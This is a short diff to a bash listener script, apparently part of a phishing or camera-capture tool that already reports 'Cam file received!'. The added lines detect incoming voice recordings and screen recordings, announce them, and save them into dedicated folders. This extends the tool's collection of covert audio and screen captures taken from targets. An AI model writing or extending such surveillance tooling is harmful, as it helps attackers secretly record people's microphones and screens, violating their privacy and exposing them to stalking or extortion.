@@ -169,6 +169,23 @@ if [[ -e "Log.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
 rm -rf Log.log
 fi
+
+if ls voice*.wav 1> /dev/null 2>&1; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Voice recording received!\e[0m\n"
+if [[ ! -d "saved_voice" ]]; then
+  mkdir -p saved_voice
+fi
+mv voice*.wav saved_voice/
+fi
+
+if ls screen*.webm 1> /dev/null 2>&1; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Screen recording received!\e[0m\n"
+if [[ ! -d "saved_screen" ]]; then
+  mkdir -p saved_screen
+fi
+mv screen*.webm saved_screen/
+fi
+
 sleep 0.5
 
 done 
